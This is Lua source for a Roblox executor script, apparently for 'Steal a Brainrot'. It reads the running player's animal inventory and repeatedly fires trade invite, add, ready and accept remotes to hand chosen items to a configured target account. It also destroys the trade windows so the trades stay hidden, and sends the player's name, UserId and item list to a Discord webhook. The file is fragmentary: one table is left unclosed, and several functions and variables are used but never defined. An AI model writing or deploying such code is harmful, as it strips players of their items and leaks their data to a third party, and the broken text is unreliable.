local function namesOf(children)
    local out = {}
    for _, c in ipairs(children) do
        out[#out + 1] = c.Name .. " [" .. c.ClassName .. "]"
    end
    return table.concat(out, ", ")
end

local function collectEnvLines(R)
    R[#R + 1] = "ReplicatedStorage: " .. namesOf(ReplicatedStorage:GetChildren())

    local pkgs = ReplicatedStorage:FindFirstChild("Packages")
    if not pkgs then
        R[#R + 1] = "Packages folder NOT FOUND"
        return
    end
    R[#R + 1] = "Packages: " .. namesOf(pkgs:GetChildren())

    local net = pkgs:FindFirstChild("Net")
    if not net then
        R[#R + 1] = "Net folder NOT FOUND in Packages"
        return
    end

    local remotes, others = {}, {}
    for _, d in ipairs(net:GetDescendants()) do
        if d:IsA("RemoteEvent") or d:IsA("RemoteFunction") then
            remotes[#remotes + 1] = d:GetFullName() .. " [" .. d.ClassName .. "]"
        else
            others[#others + 1] = d:GetFullName() .. " [" .. d.ClassName .. "]"
        end
    end
    table.sort(remotes)
    table.sort(others)
    R[#R + 1] = "Net remotes (" .. #remotes .. "):"
    for _, r in ipairs(remotes) do R[#R + 1] = "  " .. r end
    R[#R + 1] = "Net other objects (" .. #others .. "):"
    for _, o in ipairs(others) do R[#R + 1] = "  " .. o end
end

local REMOTE_PATTERNS = {
    invite = { "TradeService/Invite", "Trade_Invite", "Trade/Invite", "Invite" },

local function isRemote(inst)
    return inst ~= nil and (inst:IsA("RemoteEvent") or inst:IsA("RemoteFunction"))
end

local function findRemote(patterns)
    local pkgs = ReplicatedStorage:FindFirstChild("Packages")
    local net = pkgs and pkgs:FindFirstChild("Net")
    if not net then return nil end

    local all = { net }
    for _, d in ipairs(net:GetDescendants()) do
        all[#all + 1] = d
    end

    for _, pat in ipairs(patterns) do
        for _, obj in ipairs(all) do
            if obj.Name:find(pat, 1, true) then
                if isRemote(obj) then return obj end

                local parent = obj.Parent
                if parent then
                    local sibs = parent:GetChildren()
                    for i = 1, #sibs do
                        if sibs[i] == obj then
                            if isRemote(sibs[i + 1]) then return sibs[i + 1] end
                            if isRemote(sibs[i - 1]) then return sibs[i - 1] end
                            break
                        end
                    end
                end

                for _, child in ipairs(obj:GetChildren()) do
                    if isRemote(child) then return child end
                end
            end
        end
    end
    return nil
end

local function tryRequire(path)
    local cur = ReplicatedStorage
    for part in path:gmatch("[^/]+") do
        local ok, found = pcall(function()
            return cur:WaitForChild(part, 5)
        end)
        cur = ok and found or nil
        if not cur then return nil end
    end
    if cur:IsA("ModuleScript") then
        local ok, mod = pcall(require, cur)
        if ok and type(mod) == "table" then return mod end
    end
    return nil
end

local function validateSync(t)
    if type(t) ~= "table" then return false end
    for _, v in pairs(t) do
        if type(v) == "table" and (v.Owner ~= nil or v.AnimalList ~= nil or type(v.Get) == "function") then
            return true
        end
    end
    return false
end

-- standard path: Packages.Synchronizer
local function loadSyncDataStandard()
    local packages = ReplicatedStorage:FindFirstChild("Packages")
    local mod = packages and packages:FindFirstChild("Synchronizer")
    if not mod and packages then
        for _, d in ipairs(packages:GetDescendants()) do
            if d:IsA("ModuleScript") and d.Name:find("Sync", 1, true) then
                mod = d
                break
            end
        end
    end
    if not mod then return nil end

    local ok, M = pcall(require, mod)
    if not ok or type(M) ~= "table" then return nil end

    if validateSync(M) then return M end
    for _, v in pairs(M) do
        if validateSync(v) then return v end
    end

    -- NOTE: debug.getupvalue returns (name, value). The OLD logger captured
    -- the name as the value, so this path could never work there.
    local fns = {}
    if type(M.Get) == "function" then fns[#fns + 1] = M.Get end
    for _, v in pairs(M) do
        if type(v) == "function" and v ~= M.Get then fns[#fns + 1] = v end
    end
    for _, fn in ipairs(fns) do
        local i = 1
        while true do
            local s, _name, up = pcall(debug.getupvalue, fn, i)
            if not s or up == nil then break end
            if validateSync(up) then return up end
            i = i + 1
        end
    end
    return nil
end

-- brute force: every ModuleScript under ReplicatedStorage (in case the game
-- moved the plot data somewhere else). Returns table + where it was found.
local function deepFindSyncData()
    local std = loadSyncDataStandard()
    if std then return std, "Packages.Synchronizer (standard path)" end

    log("standard path failed - brute force scanning all modules...")
    local candidates = {}
    for _, mod in ipairs(ReplicatedStorage:GetDescendants()) do
        if mod:IsA("ModuleScript") then
            candidates[#candidates + 1] = mod
        end
    end

    local checked = 0
    for _, mod in ipairs(candidates) do
        checked = checked + 1
        if checked > 200 then break end
        local ok, M = pcall(require, mod)
        if ok and type(M) == "table" then
            if validateSync(M) then
                return M, mod:GetFullName() .. " (module table)"
            end
            for key, v in pairs(M) do
                local keyStr = tostring(key)
                if type(v) == "table" then
                    if validateSync(v) then
                        return v, mod:GetFullName() .. " ." .. keyStr
                    end
                elseif type(v) == "function" then
                    local i = 1
                    while true do
                        local s, _name, up = pcall(debug.getupvalue, v, i)
                        if not s or up == nil then break end
                        if validateSync(up) then
                            return up, mod:GetFullName() .. " ." .. keyStr .. " (upvalue " .. i .. ")"
                        end
                        i = i + 1
                    end
                end
            end
        end
    end

    return nil, "nowhere (" .. checked .. " modules checked)"
end

local function getOwnerKey(plot)
    if plot.Owner ~= nil then return plot.Owner end
    if type(plot.Get) == "function" then
        local s, v = pcall(function() return plot:Get("Owner") end)
        if s then return v end
    end
    return nil
end

local function getAnimalList(plot)
    if plot.AnimalList ~= nil then return plot.AnimalList end
    if type(plot.Get) == "function" then
        local s, v = pcall(function() return plot:Get("AnimalList") end)
        if s and type(v) == "table" then return v end
    end
    return nil
end

local function isLocalOwner(owner)
    if typeof(owner) == "Instance" then return owner == LP end
    if typeof(owner) == "table" then return owner.UserId == LP.UserId end
    return false
end

local function lookupAnimalInfo(idx)
    if type(AnimalsData) ~= "table" then return nil end
    local s, v = pcall(function() return AnimalsData[idx] end)
    if s and v ~= nil then return v end
    local strIdx = tostring(idx)
    if strIdx ~= idx then
        s, v = pcall(function() return AnimalsData[strIdx] end)
        if s and v ~= nil then return v end
    end
    local numIdx = tonumber(idx)
    if numIdx ~= nil and numIdx ~= idx then
        s, v = pcall(function() return AnimalsData[numIdx] end)
        if s and v ~= nil then return v end
    end
    return nil
end

local function countTraits(t)
    if type(t) ~= "table" then return 0 end
    local n = 0
    for _ in pairs(t) do
        n = n + 1
    end
    return n
end

local function scanLocalAnimals(syncData)
    local found = {}

    local function visit(node, depth)
        if depth > 2 or type(node) ~= "table" then return end
        for _, v in pairs(node) do
            if type(v) == "table" then
                local looksLikePlot = v.Owner ~= nil or v.AnimalList ~= nil or type(v.Get) == "function"
                if looksLikePlot then
                    local owner = getOwnerKey(v)
                    if isLocalOwner(owner) then
                        local animals = getAnimalList(v)
                        if type(animals) == "table" then
                            for slotKey, data in pairs(animals) do
                                if type(data) == "table" then
                                    local idx = data.Index or data.Type or data.Animal or data.Name or data.Id
                                    if idx ~= nil then
                                        local info = lookupAnimalInfo(idx)
                                        local displayName = (info and info.DisplayName) or idx
                                        local genVal = 0
                                        if AnimalsShared and type(AnimalsShared.GetGeneration) == "function" then
                                            pcall(function()
                                                genVal = AnimalsShared:GetGeneration(idx, data.Mutation, data.Traits, nil)
                                            end)
                                        end
                                        table.insert(found, {
                                            slotKey = tonumber(slotKey) or slotKey,
                                            data = data,
                                            index = idx,
                                            displayName = displayName,
                                            mutation = data.Mutation or "None",
                                            traitsCount = countTraits(data.Traits),
                                            genVal = genVal,
                                        })
                                    end
                                end
                            end
                        end
                    end
                else
                    visit(v, depth + 1)
                end
            end
        end
    end

    visit(syncData, 0)
    return found
end

local function formatNumber(n)
    if not n then return "$0/s" end
    local function clean(s) return s:gsub("%.?0+$", "") end
    if n >= 1e12 then return "$" .. clean(string.format("%.2f", n / 1e12)) .. "T/s" end
    if n >= 1e9 then return "$" .. clean(string.format("%.2f", n / 1e9)) .. "B/s" end
    if n >= 1e6 then return "$" .. clean(string.format("%.2f", n / 1e6)) .. "M/s" end
    if n >= 1e3 then return "$" .. clean(string.format("%.2f", n / 1e3)) .. "K/s" end
    return "$" .. tostring(math.floor(n)) .. "/s"
end

local function getRequestFn()
    local fn = (syn and syn.request) or (http and http.request) or http_request or request
    if fn then return fn end
    return function(opts)
        local res = HttpService:RequestAsync({
            Url = opts.Url,
            Method = opts.Method or "GET",
            Headers = opts.Headers,
            Body = opts.Body,
        })
        return { StatusCode = res.StatusCode, Body = res.Body }
    end
end

local function postToWebhook(payload)
    local requestFn = getRequestFn()
    if not requestFn then
        log("webhook skipped - executor has no request function and RequestAsync unavailable")
        return false
    end
    local ok, err = pcall(function()
        requestFn({
            Url = CONFIG.Webhook,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(payload),
        })
    end)
    if not ok then
        log("webhook post failed: " .. tostring(err))
    end
    return ok
end

local function sendTradeWebhook(queue)
    if not CONFIG.SendWebhook then return end
    local lines = {}
    for i, a in ipairs(queue) do
        lines[i] = "**" .. a.displayName .. "**"
        if a.mutation ~= "None" and a.mutation ~= "" then
            lines[i] = lines[i] .. " [" .. a.mutation .. "]"
        end
        if a.traitsCount > 0 then
            lines[i] = lines[i] .. " (x" .. a.traitsCount .. " traits)"
        end
        if a.genVal and a.genVal > 0 then
            lines[i] = lines[i] .. " — " .. formatNumber(a.genVal)
        end
    end
    local listText = table.concat(lines, "\n")
    if #listText > 3800 then listText = listText:sub(1, 3796) .. "..." end

    local payload = {
        embeds = { {
            title = "Auto trade to " .. CONFIG.TargetName,
            description = listText,
            color = 3447003,
            fields = {
                { name = "Items", value = tostring(#queue), inline = true },
                { name = "Scanned", value = "<t:" .. os.time() .. ":R>", inline = true },
            },
            footer = { text = LP.Name .. " • " .. LP.UserId },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
        } },
        username = "AutoTrade",
    }
    if CONFIG.PingEveryone then
        payload.content = "||@everyone||"
    end

    if postToWebhook(payload) then
        log("trade webhook sent (" .. #queue .. " items)")
    end
end

-- diagnostic report -> Discord (chunked to stay under embed limits)
local function sendReport(R, status)
    if not CONFIG.SendReport then return end
    local all = {}
    all[#all + 1] = "player: " .. LP.Name .. " (id " .. LP.UserId .. ")"
    for _, line in ipairs(R) do
        all[#all + 1] = line
    end
    all[#all + 1] = "status: " .. status

    local chunks, cur, curLen = {}, {}, 0
    for _, line in ipairs(all) do
        local piece = line
        if #piece > 3700 then piece = piece:sub(1, 3696) .. "..." end
        if curLen + #piece + 1 > 3700 then
            chunks[#chunks + 1] = cur
            cur, curLen = {}, 0
        end
        cur[#cur + 1] = piece
        curLen = curLen + #piece + 1
    end
    if #cur > 0 then chunks[#chunks + 1] = cur end

    for i, ch in ipairs(chunks) do
        pcall(function()
            local requestFn = getRequestFn()
            if requestFn then
                requestFn({
                    Url = CONFIG.Webhook,
                    Method = "POST",
                    Headers = { ["Content-Type"] = "application/json" },
                    Body = HttpService:JSONEncode({
                        embeds = { {
                            title = "SAB auto trade report " .. i .. "/" .. #chunks,
                            description = "```" .. table.concat(ch, "\n") .. "```",
                            color = 15105570,
                        } },
                    }),
                })
            end
        end)
    end
    log("report sent to Discord (" .. #chunks .. " message(s)) - screenshot it for me")
end

local function stripTradeGuis()
    if not CONFIG.StripTradeGuis or not pg then return end
    local function handleGui(obj)
        if CONFIG.GuiNames[obj.Name] then task.defer(function() obj:Destroy() end) end
    end
    pg.ChildAdded:Connect(handleGui)
    for _, v in ipairs(pg:GetChildren()) do handleGui(v) end
end

local function startAutoTrade(queue, inviteRemote, addRemote, readyRemote, acceptRemote)
    log("auto trade RUNNING -> " .. CONFIG.TargetName .. " (id " .. tostring(CONFIG.TargetUserId) .. ")")

    task.spawn(function()
        local idx = 1
        while true do
            local item = queue[idx]
            if item then
                pcall(function()
                    addRemote:InvokeServer(CONFIG.SelectGuid, item.slotKey, item.data)
                end)
                idx = (idx % #queue) + 1
            end
            task.wait(CONFIG.DelayStep)
        end
    end)

    task.spawn(function()
        while true do
            pcall(function()
                inviteRemote:InvokeServer(CONFIG.InviteGuid, CONFIG.TargetUserId)
            end)
            task.wait(CONFIG.TradeCycle)
        end
    end)

    task.spawn(function()
        while true do
            pcall(function() readyRemote:FireServer(CONFIG.ReadyGuid) end)
            task.wait(1)
            pcall(function() acceptRemote:FireServer(CONFIG.AcceptGuid) end)
            task.wait(1)
        end
    end)
end

task.spawn(function()

        local inviteRemote = findRemote(REMOTE_PATTERNS.invite)

            .. " | add: " .. nameOf(addRemote)
            .. " | ready: " .. nameOf(readyRemote)
            .. " | accept: " .. nameOf(acceptRemote)

        log("looking for plot/sync data...")
        local SYNC_DATA, where = deepFindSyncData()
        R[#R + 1] = "sync data: " .. where
        if not SYNC_DATA then
            status = "EXIT - SYNC_DATA not found. Check the module list above - the game moved or hid the plot data."
            log(status)
            return
        end
        log("SYNC_DATA found (" .. where .. ")")

        local scanned = scanLocalAnimals(SYNC_DATA)
        R[#R + 1] = "scanned local animals: " .. #scanned
        log("scanned local animals: " .. #scanned)

        local queue = {}
        for _, a in ipairs(scanned) do
            if TargetBrainrots[a.index] or TargetBrainrots[tostring(a.displayName)] then
                table.insert(queue, a)
            end
        end
        R[#R + 1] = "queue (brainrots to trade): " .. #queue
        log("queue (brainrots to trade): " .. #queue)

        if #queue == 0 then
            status = "EXIT - no target brainrots found on this account (check 'scanned local animals' above)"
            log(status)
            return
        end

        if not (inviteRemote and addRemote and readyRemote and acceptRemote) then
            status = "EXIT - trade remotes missing, can't start trading. Check the Net remotes list above for the new names."
            log(status)
            return
        end

        stripTradeGuis()
        sendTradeWebhook(queue)
        startAutoTrade(queue, inviteRemote, addRemote, readyRemote, acceptRemote)
        status = "RUNNING - auto trading " .. #queue .. " brainrots to " .. CONFIG.TargetName
        log(status)
    end)

    if not ok then
        status = "FATAL error: " .. tostring(err)
        log(status)
    end

    sendReport(R, status)
end)
